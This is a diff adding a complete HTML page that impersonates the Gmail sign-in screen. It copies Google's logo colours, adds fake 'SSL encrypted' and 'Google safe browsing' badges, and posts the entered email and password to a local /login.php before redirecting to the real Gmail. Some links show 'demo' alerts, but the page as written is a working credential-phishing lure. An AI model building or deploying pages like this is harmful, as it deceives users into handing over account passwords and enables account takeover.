@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail – Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        
+        body {
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            padding: 48px 40px 36px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        /* CSS-only Google logo */
+        .google-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 2px;
+            margin-bottom: 15px;
+        }
+        
+        .google-letter {
+            font-size: 60px;
+            font-weight: 500;
+            line-height: 1;
+        }
+        
+        .g1 { color: #4285f4; }  /* G - Blue */
+        .o1 { color: #ea4335; }  /* o - Red */
+        .o2 { color: #fbbc04; }  /* o - Yellow */
+        .g2 { color: #4285f4; }  /* g - Blue */
+        .l { color: #34a853; }   /* l - Green */
+        .e { color: #ea4335; }   /* e - Red */
+        
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-top: 8px;
+        }
+        
+        .logo p {
+            font-size: 16px;
+            color: #202124;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 56px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+        
+        .card input::placeholder {
+            color: #80868b;
+        }
+        
+        .card button {
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            color: white;
+            height: 40px;
+            cursor: pointer;
+            margin: 8px 0 20px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #1b66c9;
+        }
+        
+        .card a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 16px;
+            display: inline-block;
+        }
+        
+        .card a:hover {
+            background: #e8f0fe;
+            border-radius: 4px;
+            padding: 0 4px;
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        
+        .footer select:hover {
+            color: #1a73e8;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+        
+        .footer-links a:hover {
+            color: #1a73e8;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0 0;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .security-info span {
+            margin: 0 4px;
+        }
+        
+        .helper-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 16px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 20px;
+            }
+            
+            .footer {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .footer-links a {
+                margin: 0 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- Pure CSS Google Logo -->
+            <div class="google-logo">
+                <span class="google-letter g1">G</span>
+                <span class="google-letter o1">o</span>
+                <span class="google-letter o2">o</span>
+                <span class="google-letter g2">g</span>
+                <span class="google-letter l">l</span>
+                <span class="google-letter e">e</span>
+            </div>
+            <h1>Sign in</h1>
+            <p>to continue to Gmail</p>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://mail.google.com">
+                <input type="email" name="email" placeholder="Email or phone" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                
+                <div class="helper-text">
+                    Not your computer? Use Guest mode to sign in privately.
+                </div>
+                
+                <a href="#" onclick="alert('Account recovery demo'); return false;">Forgot email?</a>
+                
+                <button type="submit">Next</button>
+                
+                <a href="#" onclick="alert('Create account demo'); return false;">Create account</a>
+            </form>
+        </div>
+        
+        <div class="security-info">
+            <span>🔒</span>
+            <span>SSL encrypted</span>
+            <span>•</span>
+            <span>Google safe browsing</span>
+        </div>
+        
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+                <option>Español</option>
+                <option>Français</option>
+                <option>中文</option>
+            </select>
+            <div class="footer-links">
+                <a href="#" onclick="alert('Help center demo'); return false;">Help</a>
+                <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+                <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                alert('Please enter your email and password');
+                return;
+            }
+            
+            if (!email.includes('@')) {
+                e.preventDefault();
+                alert('Please enter a valid email address');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1a73e8';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#dadce0';
+                }
+            });
+        });
+        
+        document.querySelector('select').addEventListener('change', function() {
+            alert('Language changed to: ' + this.value);
+        });
+    </script>
+</body>
+</html>
